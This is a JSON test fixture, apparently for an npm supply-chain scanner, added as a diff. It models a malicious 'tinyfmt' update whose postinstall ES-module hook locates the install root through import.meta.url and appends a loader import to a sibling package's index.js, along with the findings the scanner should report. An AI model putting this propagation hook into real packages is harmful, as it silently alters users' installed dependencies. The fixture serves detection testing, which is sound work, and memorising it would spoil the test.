@@ -1,0 +1,58 @@
+{
+  "id": "install-root-esm-url-climb",
+  "title": "ESM postinstall hook resolves the install root from import.meta.url and plants a loader",
+  "category": "install-time-self-propagation",
+  "verdict": "malicious",
+  "threatClass": "self-propagating-worm",
+  "source": "synthetic",
+  "intent": "Model local propagation from an ES module one directory deep: new URL('../../', import.meta.url) is the directory dependencies are unpacked into, and the hook writes a loader into a sibling package through it. The source never names node_modules. Inert fixture; the target is a fixture path, not a real tree.",
+  "previousPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.0"
+  },
+  "stagedPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.1",
+    "scripts": {
+      "postinstall": "node lib/hook.mjs"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 36,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.0\"}"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 82,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.1\",\"scripts\":{\"postinstall\":\"node lib/hook.mjs\"}}"
+    },
+    {
+      "path": "lib/hook.mjs",
+      "size": 181,
+      "sha256": "hook-mjs",
+      "flags": [],
+      "textSample": "import { appendFileSync } from 'node:fs';\nconst modules = new URL('../../', import.meta.url);\nappendFileSync(new URL('left-pad/index.js', modules), \"\\nimport 'tinyfmt/loader';\\n\");\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "install-script.lifecycle",
+      "severity": "high",
+      "file": "package.json"
+    },
+    {
+      "ruleId": "propagation.package-mutation",
+      "severity": "high",
+      "file": "lib/hook.mjs"
+    }
+  ]
+}
